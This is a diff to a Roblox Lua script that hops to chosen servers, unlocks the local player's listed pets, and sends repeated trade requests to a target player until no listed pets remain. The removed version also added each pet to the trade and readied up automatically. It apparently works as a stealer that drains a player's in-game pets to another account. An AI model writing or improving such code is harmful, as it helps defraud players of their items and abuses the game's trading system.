@@ -9,13 +9,27 @@ local targetJobIds = {
 
 -- SERVICES
 local Players = game:GetService("Players")
-local Network = require(game:GetService("ReplicatedStorage").Modules.Network)
-local Replication = require(game:GetService("ReplicatedStorage").Game.Replication)
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TeleportService = game:GetService("TeleportService")
+
+-- MODULES
+local Network = require(ReplicatedStorage.Modules.Network)
+local Replication = require(ReplicatedStorage.Game.Replication)
 
 -- VARIABLES
 local player = Players.LocalPlayer
 local attemptedJobs = {}
+local inTrade = false
+
+-- TRADE STATE DETECTION
+Network:BindEvents({
+	StartTrade = function()
+		inTrade = true
+	end,
+	CloseTrade = function()
+		inTrade = false
+	end,
+})
 
 -- UTILS
 local function WaitForCondition(fn, timeout)
@@ -52,12 +66,7 @@ local function UnlockPets()
 	if not pets then return end
 
 	for _, petData in pairs(pets) do
-		if petData
-			and petData.Id
-			and petData.Name
-			and lookup[petData.Name]
-			and petData.Locked
-		then
+		if petData and petData.Id and petData.Name and lookup[petData.Name] and petData.Locked then
 			Network:InvokeServer("LockPet", petData.Id, false)
 		end
 	end
@@ -74,11 +83,7 @@ local function GetPetIDsByName()
 	if not pets then return ids end
 
 	for _, petData in pairs(pets) do
-		if petData
-			and petData.Id
-			and petData.Name
-			and lookup[petData.Name]
-		then
+		if petData and petData.Id and petData.Name and lookup[petData.Name] then
 			table.insert(ids, petData.Id)
 		end
 	end
@@ -87,8 +92,7 @@ local function GetPetIDsByName()
 end
 
 local function HasPetsToTrade()
-	local ids = GetPetIDsByName()
-	return #ids > 0
+	return #GetPetIDsByName() > 0
 end
 
 -- JOB / SERVER LOGIC
@@ -154,62 +158,41 @@ local function JoinRandomJob()
 	end
 end
 
--- TRADE LOGIC
+-- TRADE LOOP: spam every 1s until trade starts, then stop spamming
 local function TradeWithTarget()
+	WaitForPets(20)
+
 	while true do
-		UnlockPets()
+		print("In trade =", inTrade)
 
 		if not HasPetsToTrade() then
 			player:Kick("No more pets to trade")
 			return
 		end
 
+		UnlockPets()
+
 		local target = FindTargetPlayer()
-		if not target then
-			task.wait(5)
-			return
+		if target then
+			if not inTrade then
+				Network:FireServer("SendTrade", target)
+			end
+
+			-- once trade starts (StartTrade event), wait until it closes to resume spamming
+			if inTrade then
+				WaitForCondition(function()
+					return not inTrade
+				end, 999999)
+			end
 		end
 
-		Network:FireServer("SendTrade", target)
-
-		local tradeOpened = WaitForCondition(function()
-			return player.PlayerGui.Trading.Enabled
-		end, 15)
-
-		if not tradeOpened then
-			task.wait(5)
-			return
-		end
-
-		local petIDs = GetPetIDsByName()
-		for _, id in ipairs(petIDs) do
-			Network:InvokeServer("AddTradeItem", {"Pet", id})
-		end
-
-		Network:FireServer("ReadyUp", false, true)
-
-		WaitForCondition(function()
-			return not player.PlayerGui.Trading.Enabled
-		end, 30)
-
-		task.wait(5)
+		task.wait(1)
 	end
 end
 
 -- MAIN
-WaitForPets(20)
-
-if not HasPetsToTrade() then
-	player:Kick("No more pets to trade")
-	return
+if not IsInTargetJob() then
+	JoinRandomJob()
 end
 
-if IsInTargetJob() then
-	TradeWithTarget()
-else
-	while true do
-		JoinRandomJob()
-		TradeWithTarget()
-		task.wait(1)
-	end
-end
+TradeWithTarget()
